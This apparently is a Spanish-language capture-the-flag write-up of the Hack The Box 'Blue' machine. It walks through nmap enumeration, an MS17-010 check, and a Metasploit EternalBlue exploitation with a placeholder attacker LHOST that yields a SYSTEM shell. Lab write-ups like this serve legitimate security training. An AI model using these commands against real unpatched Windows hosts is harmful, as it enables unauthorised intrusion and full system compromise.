---
tags:
  - Cybersecurity
  - eCPPT
  - Labs
  - HTB
  - Easy
  - SMB
  - MSF
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Enumeración del sistema|Enumeración del sistema]]
	- [[#Enumeración#Enumeración de puertos|Enumeración de puertos]]
- [[#Explotación|Explotación]]
	- [[#Explotación#EternalBlue|EternalBlue]]

---
# Blue

![](Screenshots/Pasted%20image%2020260501192057.png)

>Máquina de Hack The Box llamada **[Blue](https://app.hackthebox.com/machines/Blue)**, centrada en la explotación de la vulnerabilidad crítica **MS17-010 (EternalBlue)** en sistemas Windows.  
>La intrusión comienza con la enumeración de servicios SMB, donde se identifica que el sistema es vulnerable a esta falla ampliamente conocida. Aprovechando esta vulnerabilidad, se obtiene ejecución remota de código sin autenticación.  
>Mediante el uso de Metasploit, se consigue acceso como **NT AUTHORITY\SYSTEM**, comprometiendo completamente la máquina.

Máquina de Hack The Box llamada **[Blue](https://app.hackthebox.com/machines/Blue)**, centrada en la explotación de la vulnerabilidad crítica **MS17-010 (EternalBlue)** en sistemas Windows.  
La intrusión comienza con la enumeración de servicios SMB, donde se identifica que el sistema es vulnerable a esta falla ampliamente conocida. Aprovechando esta vulnerabilidad, se obtiene ejecución remota de código sin autenticación.  
Mediante el uso de Metasploit, se consigue acceso como **NT AUTHORITY\SYSTEM**, comprometiendo completamente la máquina.

---
## Enumeración
### Enumeración del sistema

```PowerShell
ping -c 1 10.129.29.218
PING 10.129.29.218 (10.129.29.218) 56(84) bytes of data.
64 bytes from 10.129.29.218: icmp_seq=1 ttl=127 time=39.9 ms

--- 10.129.29.218 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 39.931/39.931/39.931/0.000 ms
```

El `TTL=127` indica que probablemente estamos ante un sistema Windows.
### Enumeración de puertos

```PowerShell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.29.218 -oG allPorts
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127
```

```PowerShell
nmap -p135,139,445,49152,49153,49154,49155,49156,49157 -sCV 10.129.29.218 -oN targeted
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-01T18:25:23+01:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -19m57s, deviation: 34m35s, median: 0s
| smb2-time: 
|   date: 2026-05-01T17:25:20
|_  start_date: 2026-05-01T17:19:59
```

Al ver que el sistema operativo es `Windows 7 Professional 7601`, es bastante antiguo.

Se utiliza un script de Nmap específico para comprobar si el sistema es vulnerable a `MS17-010`.

```PowerShell
nmap -p 445 --script smb-vuln-ms17-010 10.129.29.218
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

Es vulnerable a `EternalBlue`.

---
## Explotación
### EternalBlue

**MS17-010 (EternalBlue)** es una vulnerabilidad en el protocolo SMBv1 que permite ejecución remota de código sin autenticación.

Se utiliza el módulo de Metasploit para automatizar la explotación de **EternalBlue**, que permite obtener una sesión remota en el sistema vulnerable.

```PowerShell
msfconsole -q
msf > search EternalBlue

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
   2     \_ target: Windows 7                         .                .        .      .
   3     \_ target: Windows Embedded Standard 7       .                .        .      .
   4     \_ target: Windows Server 2008 R2            .                .        .      .
   5     \_ target: Windows 8                         .                .        .      .
   6     \_ target: Windows 8.1                       .                .        .      .
   7     \_ target: Windows Server 2012               .                .        .      .
   8     \_ target: Windows 10 Pro                    .                .        .      .
   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   11    \_ target: Automatic                         .                .        .      .
   12    \_ target: PowerShell                        .                .        .      .
   13    \_ target: Native upload                     .                .        .      .
   14    \_ target: MOF upload                        .                .        .      .
   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   18    \_ AKA: ETERNALBLUE                          .                .        .      .
   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
   23    \_ AKA: ETERNALBLUE                          .                .        .      .
   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   Yes    MS17-010 SMB RCE Detection
   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
   26    \_ AKA: ETERNALBLUE                          .                .        .      .
   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
   28    \_ target: Execute payload (x64)             .                .        .      .
   29    \_ target: Neutralize implant

use 0 | use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.29.218
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST [ATTACKER_IP]
msf exploit(windows/smb/ms17_010_eternalblue) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Automatic Target
    1   Windows 7
    2   Windows Embedded Standard 7
    3   Windows Server 2008 R2
    4   Windows 8
    5   Windows 8.1
    6   Windows Server 2012
    7   Windows 10 Pro
    8   Windows 10 Enterprise Evaluation

msf exploit(windows/smb/ms17_010_eternalblue) > set target 1
msf exploit(windows/smb/ms17_010_eternalblue) > exploit
```

Se obtiene una consola interactiva como `nt authority\system`.

La flag de `usuario` se encuentra en: `C:\Users\haris\Desktop`.

La flag de `root` se encuentra en: `C:\Users\Administrator\Desktop`.

---